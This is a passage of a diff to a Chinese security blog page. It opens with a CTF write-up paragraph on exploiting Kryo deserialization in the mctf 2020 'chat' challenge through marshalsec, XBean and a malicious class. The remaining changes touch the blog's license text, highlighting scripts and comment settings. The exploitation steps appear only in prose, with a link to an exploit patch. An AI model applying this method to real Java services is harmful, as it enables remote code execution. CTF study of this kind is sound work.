 <p>然后就大致可以确认是kyro反序列化了。具体利用方法主要是marshalsec + Xbean依赖生成一个payloadfile.然后用类似jndi的方法加载恶意class抛出Error.在error中反序列化ChatMessage类<br>不过因为没有指定类以及一些细节问题。还需要重新编译marshalsec.具体参考<a href="https://gitlab.com/mctf/quals-2020/chat/-/blob/master/exploit/marshalsec.patch" target="_blank" rel="noopener">https://gitlab.com/mctf/quals-2020/chat/-/blob/master/exploit/marshalsec.patch</a>加上一个写有静态方法抛出读文件payload的class即可达成rce.</p>
 <p>整体上我还是有很多问题……不过既然源码都有了的话以后接触到kyro反序列化再回来填坑。</p>
@@ -741,7 +1021,7 @@ fastjsonexp利用不必多说，主要是学习下原理。以下都在jdk1.8调
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -753,9 +1033,9 @@ fastjsonexp利用不必多说，主要是学习下原理。以下都在jdk1.8调
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -888,6 +1168,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1101,7 +1383,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1157,6 +1439,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
